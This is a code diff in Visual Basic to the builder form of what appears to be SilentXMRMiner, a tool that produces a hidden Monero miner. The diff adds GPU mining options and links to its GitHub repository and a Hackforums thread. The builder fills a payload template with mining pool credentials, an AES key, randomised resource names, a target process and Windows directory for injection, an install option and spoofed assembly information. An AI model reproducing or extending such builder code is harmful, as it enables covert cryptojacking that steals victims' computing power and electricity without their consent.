@@ -35,9 +35,10 @@
 
     Public OutputPayload
     Public Resources_dll = Randomi(rand.Next(5, 10))
-    Public Resources_cpu = Randomi(rand.Next(5, 10))
-    Public Resources_nvidia = Randomi(rand.Next(5, 10))
-    Public Resources_amd = Randomi(rand.Next(5, 10))
+    Public Resources_xmr = Randomi(rand.Next(5, 10))
+    Public Resources_cuda1 = Randomi(rand.Next(5, 10))
+    Public Resources_cuda2 = Randomi(rand.Next(5, 10))
+    Public Resources_cuda3 = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
     Public AESKEY As String = Randomi(rand.Next(5, 10))
 
@@ -67,22 +68,24 @@
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
             Dim InjectionTarget = txtInjection.Text.Split(" ")
             Dim Source = My.Resources.Program
-            txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
+            txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             Source = Replace(Source, "#dll", Resources_dll)
-            Source = Replace(Source, "#cpu", Resources_cpu)
-            Source = Replace(Source, "#nvidia", Resources_nvidia)
-            Source = Replace(Source, "#amd", Resources_amd)
+            Source = Replace(Source, "#xmr", Resources_xmr)
+            Source = Replace(Source, "#cuda1", Resources_cuda1)
+            Source = Replace(Source, "#cuda2", Resources_cuda2)
+            Source = Replace(Source, "#cuda3", Resources_cuda3)
             Source = Replace(Source, "#ParentRes", Resources_Parent)
             Source = Replace(Source, "#USER", txtPoolUsername.Text)
             Source = Replace(Source, "#URL", txtPoolURL.Text)
             Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
             Source = Replace(Source, "#KEY", AESKEY)
             Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
+            Source = Replace(Source, "#EnableGPU", If(toggleEnableGPU.Checked = True, "--opencl --cuda", ""))
             Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
             Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
 
 
-            txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)
+            txtLog.Text = txtLog.Text + ("Adding injection " + txtInjection.Text + vbNewLine)
 
             If chkInstall.Checked = True Then
                 Source = Replace(Source, "#Const INS = False", "#Const INS = True")
@@ -91,7 +94,7 @@
 
 
             If chkAssembly.Checked = True Then
-                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Writing Assembly Information..." + vbNewLine)
                 Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")
 
                 Source = Replace(Source, "%Title%", txtTitle.Text)
@@ -116,7 +119,7 @@
 
             If Codedom.OK = True Then
 
-                txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Done!..." + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
 
@@ -126,7 +129,7 @@
                 End Try
 
             Else
-                txtLog.Text = txtLog.Text.Insert(0, "Error!..." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Error!..." + vbNewLine)
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
             End If
@@ -313,5 +316,13 @@
         On Error Resume Next
         If Me.MephTabcontrol2.SelectedIndex = 0 Then
         End If
+    End Sub
+
+    Private Sub labelGitHub_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelGitHub.LinkClicked
+        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner")
+    End Sub
+
+    Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
+        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
     End Sub
 End Class
